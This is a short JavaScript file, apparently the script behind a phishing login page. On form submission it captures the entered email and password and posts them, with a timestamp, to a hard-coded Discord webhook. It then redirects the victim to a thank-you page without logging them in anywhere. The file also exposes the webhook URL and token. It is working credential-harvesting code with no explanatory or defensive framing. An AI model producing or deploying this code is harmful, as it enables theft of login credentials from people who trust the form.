document.getElementById("loginForm").addEventListener("submit", async (e) => {
    e.preventDefault();
  
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
  
      const webhookUrl = "https://discord.com/api/webhooks/1353017836703977544/Nyqn9A5PHvv2aJko-HGiqMo9gMGYZHoxkis6TXniI4nwJR7YozRWypYqxj7BcOCTd_eS";
  
    const payload = {
      email: email,
      password: password,
      timestamp: new Date().toISOString()
    };
  
    try {
      const response = await fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });
  
      if (response.ok) {
        console.log("Data sent successfully to webhook.");
  
        window.location.href = "/thank-you.html";
      } else {
        console.error("Failed to send data to webhook.");
        alert("An error occurred. Please try again.");
      }
    } catch (error) {
      console.error("Error sending data to webhook:", error.message);
      alert("An error occurred. Please check the console for details.");
    }
  });
